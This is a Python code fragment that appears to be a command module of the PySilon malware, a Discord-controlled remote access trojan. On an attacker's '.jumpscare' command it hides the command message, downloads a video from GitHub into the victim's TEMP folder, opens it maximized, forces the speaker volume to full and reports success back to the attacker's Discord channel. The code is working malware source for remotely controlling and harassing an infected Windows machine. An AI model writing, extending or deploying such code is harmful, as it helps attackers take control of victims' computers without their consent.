import win32gui
import win32con
import os, requests, time
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
# end of imports

# on message
elif message.content == '.jumpscare':
    await message.delete()
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))

    video_url = "https://github.com/mategol/PySilon-malware/raw/py-dev/resources/icons/jumpscare.mp4"

    temp_folder = os.environ['TEMP']
    temp_file = os.path.join(temp_folder, 'jumpscare.mp4')

    if not os.path.exists(temp_file):
        response = requests.get(video_url)
        with open(temp_file, 'wb') as file:
            file.write(response.content)

    time.sleep(1)
    os.startfile(temp_file)
    time.sleep(0.6)
    get_video_window = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(get_video_window, win32con.SW_MAXIMIZE)
    volume.SetMasterVolumeLevelScalar(1.0, None)
    embed = discord.Embed(title="🟢 Success",description=f'```Jumpscare has been triggered.```', colour=discord.Colour.green())
    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
    await message.channel.send(embed=embed)
